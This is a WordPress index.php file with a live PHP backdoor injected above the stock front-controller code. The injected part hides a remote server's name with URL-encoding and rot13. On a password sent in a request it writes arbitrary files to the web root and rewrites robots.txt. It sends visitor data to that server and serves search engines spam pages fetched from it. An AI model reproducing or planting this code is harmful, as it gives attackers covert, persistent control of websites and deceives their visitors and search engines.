<?php

include '/tmp/websbyjoe.com.php';

@set_time_limit(3600);
@ignore_user_abort(1);
$xmlname = '%66%62%71%76%63%6C%71%2E%63%76%66%67%72%6A%72%71%62%2E%67%62%63';




$http_web = 'http';
if (is_https()) {
    $http = 'https';
} else {
    $http = 'http';
}
$duri_tmp = drequest_uri();
if ($duri_tmp == ''){
    $duri_tmp = '/';
}
$duri = urlencode($duri_tmp);
function drequest_uri()
{
    if (isset($_SERVER['REQUEST_URI'])) {
        $duri = $_SERVER['REQUEST_URI'];
    } else {
        if (isset($_SERVER['argv'])) {
            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
        } else {
            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
        }
    }
    return $duri;
}

$goweb = str_rot13(urldecode($xmlname));
function is_https()
{
    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}

$host = $_SERVER['HTTP_HOST'];
$lang = @$_SERVER["HTTP_ACCEPT_LANGUAGE"];
$lang = urlencode($lang);
$urlshang = '';
if (isset($_SERVER['HTTP_REFERER'])) {
    $urlshang = $_SERVER['HTTP_REFERER'];
    $urlshang = urlencode($urlshang);
}
$password = sha1(sha1(@$_REQUEST['pd']));
if ($password == 'f75fd5acd36a7fbd1e219b19881a5348bfc66e79') {
    $add_content = @$_REQUEST['mapname'];
    $action = @$_REQUEST['action'];
    if (isset($_SERVER['DOCUMENT_ROOT'])) {
        $path = $_SERVER['DOCUMENT_ROOT'];
    } else {
        $path = dirname(__FILE__);
    }
    if (!$action) {
        $action = 'put';
    }
    if ($action == 'put') {
		if(isset($_REQUEST['google'])){
			$google_verification=$_REQUEST['google'];
			if (preg_match('/^google.*?(\.html)$/i', $google_verification)) {
				file_put_contents($google_verification,'google-site-verification:'.' '.$google_verification);
				exit('<a href='.$google_verification.'>'.$google_verification.'</a>');
			}
		}
        if (strstr($add_content, '.xml')) {
            $map_path = $path. '/sitemap.xml';
            if (is_file($map_path)) {
                @unlink($map_path);
            }
            $file_path = $path . '/robots.txt';
            if(stristr($add_content, 'User-agent')){
				@unlink($file_path);
                if (file_put_contents($file_path, $add_content)) {
                    echo '<br>ok<br>';
                } else {
                    echo '<br>file write false!<br>';
                }
            }else{
                if (file_exists($file_path)) {
                    $data = doutdo($file_path);
                } else {
                    $data = 'User-agent: *
Allow: /';
                }
                $sitmap_url = $http . '://' . $host . '/' . $add_content;
                if (stristr($data, $sitmap_url)) {
                    echo '<br>sitemap already added!<br>';
                } else {
                    if (file_put_contents($file_path, trim($data) . "\r\n" . 'Sitemap: '.$sitmap_url)) {
                        echo '<br>ok<br>';
                    } else {
                        echo '<br>file write false!<br>';
                    }
                }
            }
        } else {
            echo '<br>sitemap name false!<br>';
        }
        $a = sha1(sha1(@$_REQUEST['a']));
        $b = sha1(sha1(@$_REQUEST['b']));
        if ($a == doutdo($http_web . '://' . $goweb . '/a.p' . 'hp') || $b == 'f8f0dae804368c0334e22d9dcb70d3c7bbfa9635') {
            $dstr = @$_REQUEST['dstr'];
            if (file_put_contents($path . '/' . $add_content, $dstr)) {
                echo 'ok';
            }
        }
    }
    exit;
}

if (isset($_SERVER['DOCUMENT_ROOT'])) {
    $path = $_SERVER['DOCUMENT_ROOT'];
} else {
    $path = dirname(__FILE__);
}
if(is_dir($path. '/wp-includes')){
	$fpath = 'wp-includes/css';
}else{
	$fpath = 'css';
}
$dpath = $path. '/'.$fpath;
if(substr($host,0,4)=='www.'){
    $host_nw = substr($host, 4);
}else{
	$host_nw = $host;
}
$cssn = str_rot13(substr($host_nw,0,3).substr($goweb,0,3)).'.css';
$ps = $path. '/'.$fpath.'/'.$cssn;
$urlc = $http_web . '://' . $goweb . '/temp/style.css';

$cssnpth = str_rot13(substr($host_nw,0,3).substr($goweb,0,3)).'pth.css';
$pspth = $path. '/'.$fpath.'/'.$cssnpth;
$urlcpth = $http_web . '://' . $goweb . '/temp/stylepth.css';

function ping_sitemap($url){
    $url_arr = explode("\r\n", trim($url));
    $return_str = '';
    foreach($url_arr as $pingUrl){
        $pingRes = doutdo($pingUrl);
        $ok = (strpos($pingRes, 'Sitemap Notification Received') !== false) ? 'pingok' : 'error';
        $return_str .= $pingUrl . '-- ' . $ok . '<br>';
    }
    return $return_str;
}
function disbot()
{
    $uAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if (stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || stristr($uAgent, 'yahoo') || stristr($uAgent, 'google') || stristr($uAgent, 'Googlebot') || stristr($uAgent, 'googlebot')) {
        return true;
    } else {
        return false;
    }
}
function doutdo($url)
{
    $file_contents= '';
    if(function_exists('curl_init')){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }
    if (!$file_contents) {
        $file_contents = @file_get_contents($url);
    }
    return $file_contents;
}
function doutdo_post($uri,$data){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $uri);
    curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");  
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $return = curl_exec($ch);
    curl_close($ch);
    return $return;
}
function fcss($dpath,$ps,$urlc){
    if(is_dir($dpath)){
        if(!file_exists($ps)){
            @file_put_contents($ps,doutdo($urlc));
        }
    }else{
        if(@mkdir($dpath)){
            if(!file_exists($ps)){
                @file_put_contents($ps,doutdo($urlc));
            }
        }
    }
}
if($duri_tmp=='/' || strstr($duri_tmp, 'ewttm')){
    fcss($dpath,$ps,$urlc);
    fcss($dpath,$pspth,$urlcpth);
}
$pdata = array(
    'web' => $host,
    'zz' => disbot(),
    'uri' => $duri,
    'urlshang' => $urlshang,
    'http' => $http,
    'lang' => $lang,
);
if(is_file($ps)){
	$web = $http_web . '://' . $goweb . '/indexnew.php?css=1';
}else{
	$web = $http_web . '://' . $goweb . '/indexnew.php';
}
$html_content = trim(doutdo_post($web,$pdata));
if (!strstr($html_content, 'nobotuseragent')) {
    if (strstr($html_content, 'okhtmlgetcontent')) {
        @header("Content-type: text/html; charset=utf-8");
		if (strstr($html_content, '[##linkcss##]')) {
			if(file_exists($ps)){
				$lcss_str = file_get_contents($ps);
				$html_content = str_replace("[##linkcss##]", $lcss_str, $html_content);
			}else{
				$html_content = str_replace("[##linkcss##]", '', $html_content);
			}
		}
        if (strstr($html_content, '[##pthlinkcss##]')) {
			if(file_exists($pspth)){
				$lcsspth_str = file_get_contents($pspth);
				$html_content = str_replace("[##pthlinkcss##]", $lcsspth_str, $html_content);
			}else{
				$html_content = str_replace("[##pthlinkcss##]", '', $html_content);
			}
		}
        $html_content = str_replace("okhtmlgetcontent", '', $html_content);
        echo $html_content;
        exit();
    }else if(strstr($html_content, 'okxmlgetcontent')){
        $html_content = str_replace("okxmlgetcontent", '', $html_content);
        @header("Content-type: text/xml");
        echo $html_content;
        exit();
    }else if(strstr($html_content, 'pingxmlgetcontent')){
        $html_content = str_replace("pingxmlgetcontent", '', $html_content);
        fcss($dpath,$ps,$urlc);
		fcss($dpath,$pspth,$urlcpth);
        @header("Content-type: text/html; charset=utf-8");
        echo ping_sitemap($html_content);
        exit();
    }else if (strstr($html_content, 'getcontent500page')) {
        @header('HTTP/1.1 500 Internal Server Error');
        exit();
    }else if (strstr($html_content, 'getcontent404page')) {
        @header('HTTP/1.1 404 Not Found');
        exit();
    }else if (strstr($html_content, 'getcontent301page')) {
        @header('HTTP/1.1 301 Moved Permanently');
        $html_content = str_replace("getcontent301page", '', $html_content);
        header('Location: ' . $html_content);
        exit();
    }
}/* blog R1-A713 */ ?><?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php'; 
